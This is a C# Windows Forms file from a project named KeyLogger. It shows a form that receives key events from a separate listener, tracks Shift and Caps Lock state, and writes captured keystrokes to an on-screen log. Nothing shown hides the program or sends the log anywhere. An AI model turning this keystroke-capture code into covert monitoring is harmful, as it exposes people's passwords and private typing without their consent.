using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class FormHome : Form
    {
        [DllImport("user32.dll")]
        static extern short GetKeyState(int keyCode);

        public FormHome(KeyListener listener)
        {
            InitializeComponent();

            Listener = listener;
            Listener.KeyPressedEvent += Listener_KeyPressedEvent;
            Listener.IsListening = true;

            CurrentKeyStates = new Dictionary<Keys, bool>
            {
                { Keys.LControlKey, false },
                { Keys.RControlKey, false },
                { Keys.LShiftKey, false },
                { Keys.RShiftKey, false },
                { Keys.LMenu, false },
                { Keys.RMenu, false }
            };
        }

        public Dictionary<Keys, bool> CurrentKeyStates { get; set; }

        public bool IsCapsLockOn => GetKeyState((int)Keys.CapsLock) > 0;

        public bool IsCapital =>
            IsCapsLockOn ||
            CurrentKeyStates[Keys.LShiftKey] ||
            CurrentKeyStates[Keys.RShiftKey];

        private void Listener_KeyPressedEvent(int keyCode, bool keyDown)
        {
            var keyCodeMapped = (Keys)keyCode;

            if (keyCodeMapped == Keys.CapsLock)
            {
                return;
            }
            else if (CurrentKeyStates.ContainsKey(keyCodeMapped))
            {
                CurrentKeyStates[keyCodeMapped] = keyDown;

                TxtLog.AppendText($"{keyCodeMapped} ({(keyDown ? "/\\" : "\\/")}){Environment.NewLine}");
            }
            else if (keyDown)
            {
                if (keyCodeMapped == Keys.Space)
                {
                    TxtLog.AppendText(" ");
                }
                else if (keyCodeMapped.ToString().Length == 1)
                {
                    // Character key
                    if (IsCapital)
                    {
                        TxtLog.AppendText(keyCodeMapped.ToString().ToUpperInvariant());
                    }
                    else
                    {
                        TxtLog.AppendText(keyCodeMapped.ToString().ToLowerInvariant());
                    }
                }
                else
                {
                    TxtLog.AppendText(keyCodeMapped.ToString());
                }
            }
        }

        public KeyListener Listener { get; }

        private void BtnClear_Click(object sender, EventArgs e)
        {
            TxtLog.Clear();
        }
    }
}
